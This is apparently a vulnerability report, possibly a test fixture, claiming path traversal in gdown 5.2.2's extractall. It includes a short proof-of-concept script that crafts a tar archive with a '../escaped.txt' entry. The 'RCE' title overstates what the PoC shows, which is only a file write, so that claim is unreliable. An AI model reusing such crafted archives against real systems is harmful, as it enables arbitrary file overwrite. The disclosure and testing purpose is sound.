report.title: RCE via path traversal in gdown 5.2.2
report.body:
URGENT: gdown 5.2.2 is vulnerable to path traversal / arbitrary file write via extractall. Please assign a CVE.

Affected: 5.2.2.

Proof of concept:

```python
import os, io, tarfile, tempfile
from gdown import extractall
work = tempfile.mkdtemp(prefix="slopgate_gdown_")
archive = os.path.join(work, "evil.tar")
to = os.path.join(work, "out"); os.makedirs(to)
escaped = os.path.join(work, "escaped.txt")
with tarfile.open(archive, "w") as tf:
    data=b"pwned"; info=tarfile.TarInfo("../escaped.txt"); info.size=len(data)
    tf.addfile(info, io.BytesIO(data))
try: extractall(path=archive, to=to)
except Exception as e: print("raised:", type(e).__name__)
print("SLOPGATE:REPRODUCED" if os.path.exists(escaped) else "SLOPGATE:NOT_REPRODUCED")
```
